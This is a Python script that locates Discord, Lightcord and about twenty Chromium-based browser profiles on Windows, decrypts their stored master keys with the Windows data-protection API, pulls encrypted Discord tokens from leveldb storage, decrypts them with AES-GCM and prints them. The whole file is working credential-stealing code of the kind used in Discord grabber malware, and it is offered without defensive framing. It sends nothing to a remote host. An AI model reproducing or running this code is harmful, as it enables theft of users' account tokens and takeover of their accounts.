from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import listdir
from json import loads
from re import findall
import re
import os

tokens = []  # List to store extracted tokens
cleaned = []  # List to store cleaned tokens
checker = []  # List to store matched tokens

# Define the regex patterns to match different token formats
regex0 = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', re.IGNORECASE)
regex1 = re.compile(r'mfa\.[\w-]{84}', re.IGNORECASE)
regex2 = re.compile(r'[\w-]{26}\.[\w-]{6}\.[\w-]{15}_[\w-]{22}', re.IGNORECASE)

def decrypt(buff, master_key):
    # Decrypt the given buffer using AES encryption and the provided master key.
    try:
        # Decrypt the buffer and return the result
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def get_token():
    # Extract and process tokens from various applications' data files.
    global tokens, cleaned, checker
    
    # Define paths to various applications and browsers
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Lightcord': roaming + '\\Lightcord',

        'Chrome': local + "\\Google\\Chrome\\User Data\\Default",
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',

        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',

        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',

        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }

    for app_name, path in paths.items():
        # Check if the path exists
        if not os.path.exists(path): 
            print(f"{app_name} path does not exist")
            continue

        try:
            # Try to open the Local State file to extract the master key
            with open(path + "\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
        except:
            continue

        # Process leveldb files for tokens
        for file in listdir(path + "\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and not file.endswith(".log"): 
                continue

            try:
                with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                    for line in files:
                        line = line.strip()
                        # Extract tokens from lines using regex
                        for value in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokens.append(value)
            except PermissionError:
                continue
                
        # Clean and deduplicate tokens
        for token in tokens:
            if token.endswith("\\"):
                token = token.rstrip("\\")
            if token not in cleaned:
                cleaned.append(token)

        # Match tokens using regex patterns
        for token in cleaned:
            try:
                # Match using regex0
                for match in regex0.finditer(token):
                    checker.append(match.group())

                # Match using regex1
                for match in regex1.finditer(token):
                    checker.append(match.group())

                # Match using regex2
                for match in regex2.finditer(token):
                    checker.append(match.group())
            except IndexError:
                continue

            try:
                # Decrypt token and add to checker list
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError:
                continue

            checker.append(tok)

            # Print tokens from the checker list
            for token in checker:
                if token:
                    print(token)
                else:
                    print("No tokens found")
            
if __name__ == '__main__':
    get_token()